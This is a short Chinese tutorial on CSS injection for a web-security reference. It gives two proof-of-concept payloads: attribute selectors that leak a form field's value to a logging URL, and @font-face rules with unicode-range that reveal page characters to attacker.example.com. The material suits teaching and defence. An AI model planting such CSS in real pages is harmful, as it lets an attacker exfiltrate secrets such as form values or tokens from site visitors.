CSS 注入
================================

基本介绍
--------------------------------
CSS注入最早开始于利用CSS中的 ``expression()`` ``url()`` ``regex()`` 等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。

CSS selectors
--------------------------------
::

    <style>
        #form2 input[value^='a'] { background-image: url(http://localhost/log.php/a); }
        #form2 input[value^='b'] { background-image: url(http://localhost/log.php/b); }
        #form2 input[value^='c'] { background-image: url(http://localhost/log.php/c); }
        [...]
    </style>
    <form action="http://example.com" id="form2">
        <input type="text" id="secret" name="secret" value="abc">
    </form>

上图是利用CSS selectors完成攻击的一个示例

Abusing Unicode Range
--------------------------------
当可以插入CSS的时候，可以使用 ``font-face`` 配合 ``unicode-range`` 获取目标网页对应字符集。PoC如下

::

    <style>
    @font-face{
     font-family:poc;
     src: url(http://attacker.example.com/?A); /* fetched */
     unicode-range:U+0041;
    }
    @font-face{
     font-family:poc;
     src: url(http://attacker.example.com/?B); /* fetched too */
     unicode-range:U+0042;
    }
    @font-face{
     font-family:poc;
     src: url(http://attacker.example.com/?C); /* not fetched */
     unicode-range:U+0043;
    }
    #sensitive-information{
     font-family:poc;
    }
    </style>
    <p id="sensitive-information">AB</p>


当字符较多时，则可以结合 ``::first-line``  等CSS属性缩小范围，以获取更精确的内容
